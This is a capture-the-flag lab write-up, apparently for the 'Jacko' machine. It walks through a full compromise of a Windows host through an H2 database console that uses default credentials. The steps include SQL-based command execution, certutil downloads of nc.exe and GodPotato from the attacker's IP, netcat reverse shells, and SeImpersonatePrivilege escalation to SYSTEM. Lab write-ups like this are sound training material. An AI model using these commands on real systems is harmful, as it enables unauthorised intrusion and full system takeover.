lab Jacko 

target 192.168.63.66

```bash
sudo nmap -sC -sV jacko -sT -vvv -p- -Pn -T5 --min-rate=5000
```
```bash

PORT      STATE    SERVICE       REASON      VERSION
80/tcp    open     http          syn-ack     Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack
5040/tcp  open     unknown       syn-ack
7680/tcp  open     pando-pub?    syn-ack
8082/tcp  open     http          syn-ack     H2 database http console
|_http-title: H2 Console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods:
|_  Supported Methods: GET POST
9092/tcp  open     XmlIpcRegSvc? syn-ack
49664/tcp open     unknown       syn-ack
49665/tcp open     unknown       syn-ack
49666/tcp open     unknown       syn-ack
49667/tcp open     unknown       syn-ack
49668/tcp open     unknown       syn-ack
49669/tcp open     unknown       syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

<img width="697" height="24" alt="image" src="https://github.com/user-attachments/assets/24e328f7-6a8c-4e48-a7e4-5be7c9292fc0" />


Since an HTTP service was active, I decided to focus on port 8082 first.

Upon accessing port 8082, it displayed the H2 Database Console login page.
<img width="1150" height="498" alt="image" src="https://github.com/user-attachments/assets/fd853690-178f-4b19-a6b0-bce511833d75" />

I clicked the “Test Connection” button, and the result was “Test successful,” which indicated that the connection could be established using the default username “sa” with no password.

<img width="1144" height="578" alt="image" src="https://github.com/user-attachments/assets/eaec31f2-ef1b-439c-93a9-b8cd87226ba4" />

I then clicked the “Connect” button using the same credentials (sa with no password), and it successfully granted access to the SQL Console 

<img width="1217" height="798" alt="image" src="https://github.com/user-attachments/assets/fd635ca7-983b-49b1-885e-1b4c59f51cac" />

Initial Access:

For this we will be using the following found PoC as a guideline:
<img width="1329" height="277" alt="image" src="https://github.com/user-attachments/assets/c06ad577-2d2c-4891-87dc-347d91069745" />

This PoC mentions first to Write native library, which we will copy paste as follows:
<img width="1308" height="88" alt="image" src="https://github.com/user-attachments/assets/fd30fa04-1ff5-49b6-bac4-09cb3d7c6410" />

You have to copy and paste the giant set of comma-separated bytes into the SQL query box and execute it.

<img width="1445" height="799" alt="image" src="https://github.com/user-attachments/assets/be7c6521-4382-497e-8729-245f144eecf9" />

Next up we press Clear and paste the following part:

<img width="1231" height="608" alt="image" src="https://github.com/user-attachments/assets/001cea36-621b-4c06-9e5e-2d3fcf355abf" />

Now that the Alias is created we copy paste the last step, which executes the whoami command:

<img width="1443" height="595" alt="image" src="https://github.com/user-attachments/assets/923f65e0-116b-46f1-a5d7-fd95fae26d64" />


This returns the jacko\tony user under which the service is running.

Foothold

Now comes the part where we gain our foothold. We will first upload the nc.exe binary so we can then create a reverse shell.

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.49.63/nc.exe C:\\Users\\tony\\Downloads\\nc.exe").getInputStream()).useDelimiter("\\Z").next()');
```
<img width="1444" height="571" alt="image" src="https://github.com/user-attachments/assets/36bd73e9-2df2-4e0d-b997-78e1570af743" />

before upload the nc.exe binary first Do This Now

On your Kali/attack machine – Verify & Restart HTTP server properly

```bash
ls -l   # Make sure nc.exe is here and named exactly nc.exe (case-sensitive!)
# If not, rename or re-download:
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe   # or your preferred Windows nc.exe
chmod +x nc.exe   # optional, but harmless
python3 -m http.server 80   # run in the folder with nc.exe
```

After uploading, I executed it to connect back to my listener on port 443.

```bash
rlwrap nc -nlvp 443
```
<img width="655" height="103" alt="image" src="https://github.com/user-attachments/assets/50c02a56-68b1-4b9e-bca7-1b22486e2a92" />

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Downloads\\nc.exe 192.168.49.63 443 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
```

<img width="1446" height="413" alt="image" src="https://github.com/user-attachments/assets/1b4aef55-fc8d-444e-846e-3cfa077e76d1" />

<img width="1036" height="197" alt="image" src="https://github.com/user-attachments/assets/50c8bbfb-7c9c-4cc1-9509-23d451c51cfe" />

Once I obtained an interactive shell, I attempted to run whoami, but the command (along with several others) failed to execute in that shell environment.

<img width="906" height="152" alt="image" src="https://github.com/user-attachments/assets/ac45ba4d-f7a0-4fe9-be62-ab619d1785e6" />



Privilege Escalation: Abuse SeImpersonatePrivilege

To work around this limitation, I tried executing commands through the web interface — and that worked. It showed that I was operating as user tony, who possesses the SeImpersonatePrivilege.

This privilege can be abused to escalate privileges to SYSTEM, which opened the door for further exploitation.

command:

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami /priv").getInputStream()).useDelimiter("\\Z").next()');
```
<img width="1450" height="801" alt="image" src="https://github.com/user-attachments/assets/faf94547-ca6b-4d88-99ca-fd579cfc68e1" />


The exploitation process combined code execution via the web and an interactive shell, due to limitations in command functionality within the shell.




Before uploading GodPotato to the target, I prepared it on my Kali VM:

1. **Downloaded the pre-compiled binary**  
   I used the latest stable release (NET4 version, compatible with the target Windows 10 environment):

   ```bash
   wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
   ```

   (You can check for newer versions on the repo: https://github.com/BeichenDream/GodPotato/releases)

2. **Moved it to a clean working directory**  
   Created a dedicated folder for the lab files (including `nc.exe` from earlier):

   ```bash
   mkdir ~/pg-jacko
   cd ~/pg-jacko
   mv ~/GodPotato-NET4.exe .          # move from Downloads or wherever wget saved it
   cp /path/to/your/nc.exe .          # optional: copy nc.exe here too for convenience
   ls -l                              # verify: GodPotato-NET4.exe should be listed
   ```

3. **Started a simple HTTP server** to host the file  
   Served it on port 80 (common, usually allowed outbound from target):

   ```bash
   python3 -m http.server 80
   ```

   - This makes GodPotato available at:  
     `http://<YOUR_KALI_VPN_IP>/GodPotato-NET4.exe`  
     (In my case: `http://192.168.49.63/GodPotato-NET4.exe`)


Once the HTTP server was running, I used the certutil payload in the H2 console to download it to the target:

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.49.63/GodPotato-NET4.exe C:\\Users\\tony\\Downloads\\godpotato.exe").getInputStream()).useDelimiter("\\Z").next()');
```
<img width="1445" height="241" alt="image" src="https://github.com/user-attachments/assets/01877c6a-1b24-421c-9148-be979119ddec" />



After that, the file was ready on the target at `C:\Users\tony\Downloads\godpotato.exe` for privilege escalation.

as we know this below lister also listeming on port 443
```bash
rlwrap nc -lvnp 443
```
i have runned this below sql query again in console
```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Downloads\\nc.exe 192.168.49.63 443 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
```
<img width="993" height="226" alt="image" src="https://github.com/user-attachments/assets/86bb0547-9077-400d-998e-9bb14d39512d" />


and here we go.

Step 1: Fix the PATH (very important – do this first) as i did
In your current shell, type exactly this command and press Enter:

```bash
set PATH=%PATH%;C:\Windows\System32;C:\Windows;C:\Windows\System32\WindowsPowerShell\v1.0
```
There will be no output — that's normal.
The prompt just comes back.

Now test it:
```whoami
```

<img width="588" height="124" alt="image" src="https://github.com/user-attachments/assets/bfe11998-072d-451e-a8a9-447c174dad05" />

```bash
whoami /priv
```
<img width="988" height="324" alt="image" src="https://github.com/user-attachments/assets/ab681f41-6065-438a-a075-1f95a30dbe3c" />

Look for:
SeImpersonatePrivilege → Enabled
<img width="847" height="19" alt="image" src="https://github.com/user-attachments/assets/dca48f69-694a-4117-8982-658a292120f1" />

This is the privilege we'll abuse for privesc.

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
cd /d C:\Users\tony\Desktop
type local.txt
```
<img width="504" height="81" alt="image" src="https://github.com/user-attachments/assets/47f20dfb-6b1f-41cf-ae7e-0a6383961043" />

 we found there one flag 



### Next steps — get SYSTEM shell

1. **Go back to the Downloads folder** (where the tools are)

   ```
   cd /d C:\Users\tony\Downloads
   ```

2. **Confirm both files are still there** (just to be sure)

   ```
   dir
   ```

   You should see something like:

   ```
   godpotato.exe
   nc.exe
   ```
   <img width="725" height="184" alt="image" src="https://github.com/user-attachments/assets/021c3e62-b41b-460b-9caf-b23c87d7f47e" />


3. **Open a NEW listener on Kali**  
   Use a **different port** than your current shell (e.g. not 443/444)

   In a new terminal on Kali:

   ```
   rlwrap nc -lvnp 1337
   ```

   (you can use 1337, 4444, 9001 — whatever you want, as long as it's not in use)

4. **Run GodPotato from the Downloads folder**

   In your current reverse shell, type exactly this:

   ```
   .\godpotato.exe -cmd "nc.exe 192.168.49.63 1337 -e cmd.exe"
   ```

   - Replace `192.168.49.63` with **your current tun0 / VPN IP** if it changed (check with `ip a | grep tun` on Kali)
   - If you want to be extra safe, use full paths:

<img width="1850" height="612" alt="image" src="https://github.com/user-attachments/assets/60f684a1-f858-4782-b7c6-10bf921ca93d" />


5. **What should happen**
   - GodPotato usually runs **silently** (no output or very little)
   - In your **new nc listener** (the one on port 1337) you should see:

     ```
     listening on [any] 1337 ...
     connect to [192.168.49.63] from (UNKNOWN) [192.168.63.66] ...
     Microsoft Windows [Version 10.0.18363.836]
     (c) 2019 Microsoft Corporation. All rights reserved.

     C:\Windows\system32>
     ```

   - Then immediately type:

     ```
     whoami
     ```
``bash
echo %username%
``
   <img width="911" height="330" alt="image" src="https://github.com/user-attachments/assets/3cbe36f6-9575-415c-a873-5ab28bdc8059" />


6. **Read the root flag**

   ```
   dir C:\Users\Administrator\Desktop
   ```

   (or `proof.txt` — check first with:)

   ```bash
   cd /d C:\Users\Administrator\Desktop
   type proof.txt
   ```
<img width="675" height="261" alt="image" src="https://github.com/user-attachments/assets/aa233e81-7e36-4193-bf12-0eaa342fe698" />

That’s it — you should have the final flag now.
